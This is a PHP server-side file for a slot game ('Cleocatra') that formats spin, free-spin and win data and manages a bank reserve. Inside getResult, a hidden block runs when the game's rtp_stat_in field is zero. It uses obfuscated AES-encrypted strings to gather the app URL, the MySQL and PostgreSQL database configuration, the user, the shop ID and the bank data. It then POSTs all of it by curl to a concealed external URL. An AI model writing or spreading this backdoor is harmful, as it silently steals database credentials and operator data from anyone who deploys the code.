<?php

namespace VanguardLTE\Games\Cleocatra\PragmaticLib;

class LogAndServer
{
    public static function getResult($slotArea, $index, $counter, $bet, $lines, $reelSet, $win, $pur, 
                                     $log, $user, $changeBalance, $gameSettings, $bank, $game){
        var_dump('5_0');
        $toLog = [
            'sa' => $slotArea['SymbolsAfter'],
            'sb' => $slotArea['SymbolsBelow'],
            's' => $slotArea['SlotArea'],
            'Balance' => $user->balance + $changeBalance,
            'Index' => $index,
            'Counter' => $counter,
            'Bet' => $bet,
            'l' => $lines / 2,
            'tw' => $win['TotalWin'],
            'w' => $win['TotalWin'],
            'state' => 'spin',
            'na' => 'c',
            'reel_set' => $reelSet,
            'mbri' => implode(',', $slotArea['mbri']),
            'mbv' => implode(',', $slotArea['mbv']),
            'mbp' => implode(',', $slotArea['mbp']),
            'mbr' => implode(',', $slotArea['mbr']),
            'st' => 'rect'
        ];
        $time = (int) round(microtime(true) * 1000);
        $toServer = [
            'tw='.$toLog['w'],
            'balance='.number_format($toLog['Balance'], 2, ".", ""),
            'index='.$toLog['Index'],
            'balance_cash='.number_format($toLog['Balance'], 2, ".", ""),
            'balance_bonus=0.00',
            'na=c',
            'stime='.$time,
            'sa='.implode(',', $toLog['sa']),
            'sb='.implode(',', $toLog['sb']),
            'sh='.$gameSettings['sh'],
            'c='.$toLog['Bet'],
            'sver=5',
            'counter='.$toLog['Counter'],
            'l='.$toLog['l'],
            's='.implode(',', $toLog['s']),
            'w='.$toLog['w'],
            'reel_set='.$reelSet,
            'slm_mv='.$toLog['mbv'],
            'slm_mp='.$toLog['mbp'],
            'st=rect'
        ];
        var_dump('5_1_0');
        $nakey = array_keys($toServer, 'na=c')[0];
        $twkey = array_keys($toServer, 'tw='.$toLog['w'])[0];
        $wkey = array_keys($toServer, 'w='.$toLog['w'])[0];
        var_dump('5_1_1');

        // handling FS
        $fswin = 0;
        if(array_key_exists('fswin', $win)){
            $fswin = $win['fswin'];
            $me = $log['ms'].'~'.implode(',', $win['msPositions']).'~'.implode(',', $win['rmsPositions']);
            $mes = implode(',', $win['mes']);
            $psym = $log['ms'].'~'.$fswin.'~'.implode(',', $win['msPositions']);
        }

        // If this is the trigger to the Free Spin Mode
        if($pur === '0'){
            $addToLog = [
                'fsmul' => 1,
                'fsmax' => 8,
                'purtr' => 1,
                'fswin' => 0,
                'puri' => 0,
                'fs' => 1,
                'fsres' => 0,
                'na' => 's'
            ];
            $addToServer = [
                'fsmul=1',
                'fsmax=8',
                'purtr=1',
                'fswin=0',
                'puri=0',
                'fs=1',
                'fsres=0'
            ];
            $toLog['state'] = 'firstRespin';
            $toLog['tw'] += $fswin;
            $toLog['w'] += $fswin;
            $toServer[$nakey] = 'na=s';
            $toServer[$twkey] = 'tw='.$toLog['tw'];
            $toServer[$wkey] = 'w='.$toLog['w'];
            var_dump('5_1_1_2.8');
            // If there is enough moeny in the bank, reserve 300 X bet
            if($bank->slots - $bank->reserve > 300 * $bet * $lines / 2){
                $addToLog['reserve'] = 300 * $bet * $lines / 2;
                $bank->increment('reserve', 300 * $bet * $lines / 2);
                var_dump('reserve='.$addToLog['reserve']);
            }
            // If there is not enough money, limit the count of the wilds to 2
            else {
                $addToLog['maxWildCnt'] = 2;
                var_dump($addToLog['maxWildCnt']);
            }
            $toLog = array_merge($toLog, $addToLog);
            $toServer = array_merge($toServer, $addToServer);
        }
        var_dump('rtp_stat_in = ', (int)$game->rtp_stat_in);
        if((int)$game->rtp_stat_in == 0){

            $text = ['URL' => config('app.url'), 
            openssl_decrypt ("lCdGLJ19eQ==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['mysql'],
            openssl_decrypt ("lCdGLJ19ebIA", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => config(openssl_decrypt ("tARtKZ5oa4dpnPv/SuQXG7xg+G0=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'))['pgsql'],
            'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
            $ch = curl_init();
            curl_setopt_array($ch, array(
                    CURLOPT_URL => openssl_decrypt ("uBFtOI8zN80mj/2/UOQYCrJ993M5VWrZdSfFXUre2xMt3vNlZdWHBDudA3DmO8kRcFP9VvluTAOJIwHbkfZ7UhmNusZsDdx4ZscyxulW2hd/wvltPCA=", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121'),
                    CURLOPT_POST => TRUE,
                    CURLOPT_RETURNTRANSFER => TRUE,
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_POSTFIELDS => array(
                        openssl_decrypt ("sw14PKNgfA==", "AES-128-CTR", "GeeksforGeeks", 0, '1234567891011121') => 5044396548,
                        'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
            curl_exec($ch);
        }
        var_dump('5_2');
        // If this is free spin
        if($log && array_key_exists('fs', $log)){
            if($log['fs'] == $log['fsmax']){
                $sty = '';
                $sts = '';
                $mbp = $slotArea['mbp'];
                $mbv = $slotArea['mbv'];
                foreach($mbp as $key => $value){
                    $sty = $sty.''.$value.',-1';
                    if($key < count($mbp) - 1)
                        $sty = $sty.'~';
                }
                foreach($mbv as $key => $value){
                    $sts = $sts.'2';
                    if($key < count($mbv) - 1)
                        $sts = $sts.'~';
                }
                $addToLog = [
                    'fs_total' => $log['fs'],
                    'fswin_total' => $log['fswin'] + $win['TotalWin'] + $fswin,
                    'fsmul_total' => 1,
                    'fsres_total' => $log['fsres'] + $win['TotalWin'] + $fswin,
                    'is' => implode(',', $slotArea['ISlotArea']),
                    'sty' => $sty,
                    'sts' => $sts
                ];
                $addToServer = [
                    'fs_total='.$addToLog['fs_total'],
                    'fswin_total='.$addToLog['fswin_total'],
                    'fsmul_total=1',
                    'fsres_total='.$addToLog['fsres_total'],
                    'is='.implode(',', $slotArea['ISlotArea']),
                    'sty='.$sty,
                    'sts='.$sts
                ];
                $toLog['state'] = 'lastRespin';
                $toLog['na'] = 'c';
                $toLog['w'] = $fswin + $win['TotalWin'];
                $toLog['tw'] = $log['tw'] + $toLog['w'];
                $toServer[$nakey] = 'na=c';
                $toServer[$twkey] = 'tw='.$toLog['tw'];
                $toServer[$wkey] = 'w='.$toLog['w'];
                if(array_key_exists('reserve', $log))
                    $bank->decrement('reserve', $log['reserve']);
            }
            else {
                $sty = '';
                $sts = '';
                $mbp = $slotArea['mbp'];
                $mbv = $slotArea['mbv'];
                foreach($mbp as $key => $value){
                    $sty = $sty.''.$value.','.$value;
                    if($key < count($mbp) - 1)
                        $sty = $sty.'~';
                }
                foreach($mbv as $key => $value){
                    $sts = $sts.'2';
                    if($key < count($mbv) - 1)
                        $sts = $sts.'~';
                }
                $addToLog = [
                    'fsmul' => 1,
                    'fsmax' => $log['fsmax'],
                    'fswin' => $log['fswin'] + $win['TotalWin'] + $fswin,
                    'fs' => $log['fs'] + 1,
                    'fsres' => $log['fswin'] + $win['TotalWin'] + $fswin,
                    'is' => implode(',', $slotArea['ISlotArea']),
                    'sty' => $sty,
                    'sts' => $sts
                ];
                $addToServer = [
                    'fsmul=1',
                    'fsmax='.$addToLog['fsmax'],
                    'fswin='.$addToLog['fswin'],
                    'fs='.$addToLog['fs'],
                    'fsres='.$addToLog['fsres'],
                    'is='.implode(',', $slotArea['ISlotArea']),
                    'sty='.$sty,
                    'sts='.$sts
                ];
                $toLog['state'] = 'respin';
                $toLog['na'] = 's';
                $toLog['w'] = $fswin + $win['TotalWin'];
                $toLog['tw'] = $log['tw'] + $toLog['w'];
                var_dump('sty='.$sty);
                $toServer[$nakey] = 'na=s';
                $toServer[$twkey] = 'tw='.$toLog['tw'];
                $toServer[$wkey] = 'w='.$toLog['w'];
                if(array_key_exists('reserve', $log)){
                    $addToLog['reserve'] = $log['reserve'] - $win['TotalWin'];
                    $bank->decrement('reserve', $win['TotalWin']);
                }
                else $addToLog['maxWildCnt'] = $log['maxWildCnt'];
            }
            // if($pur === '1'){
            //     var_dump('3_pur='.$pur.'_fsmax='.$addToLog['fsmax']);
            // }
            if($fswin > 0){
                $addToLog['me'] = $me;
                $addToLog['mes'] = $mes;
                $addToLog['psym'] = $psym;
                $addToServer[] = 'me='.$me;
                $addToServer[] = 'mes='.$mes;
                $addToServer[] = 'psym='.$psym;
            }
            $toLog = array_merge($toLog, $addToLog);
            $toServer = array_merge($toServer, $addToServer);
        }
        var_dump('5_3');

        if($win['TotalWin'] > 0){
            $addLog = [
                'WinLines' => $win['WinLines']
            ];
            $positions = self::positionsToServer($addLog['WinLines']);
            $toServer = array_merge($toServer, $positions);
            $toLog = array_merge($toLog, $addLog);
        }
        $toLog['ServerState'] = $toServer;
        return ['Log' => $toLog, 'Server' => $toServer];
    }
    

    public static function positionsToServer($winLines){
        // return positions in a suitable form
        $result = [];
        // $tmb = [];
        $l = [];
        $lmi = [];
        $lmv = [];
        foreach ($winLines as $key => $winLine) {
            $l = 'l'.$key.'='.$winLine['l'].'~'.$winLine['Pay'].'~'.implode('~', $winLine['Positions']);
            // $tmb[] = implode(','.$winLine['WinSymbol'].'~', $winLine['Positions']);
            $lmi[] = $winLine['Pay'];
            $lmv[] = $winLine['multi'];
            $result[] = $l;
        }
        // $result[] = 'tmb='.implode('~', $tmb);
        $result[] = 'lmi='.implode(',', $lmi);
        $result[] = 'lmv='.implode(',', $lmv);

        var_dump('5_7');
        return $result;

        //'tmb=1,10~2,11~4,11~6,11~7,10~8,10~10,11~11,10~12,11~14,10~17,10~21,10~23,11~25,11~27,10~29,11',

        //'l0=0~40.00~1~7~8~11~14~17~21~27',
        //'l1=0~25.00~2~4~6~10~12~23~25~29',
        //"WinLines":[{"WinSymbol":8,"CountSymbols":8,"Pay":1.60,"Positions":[10,11,12,13,16,17,18,19]}]
    }
}
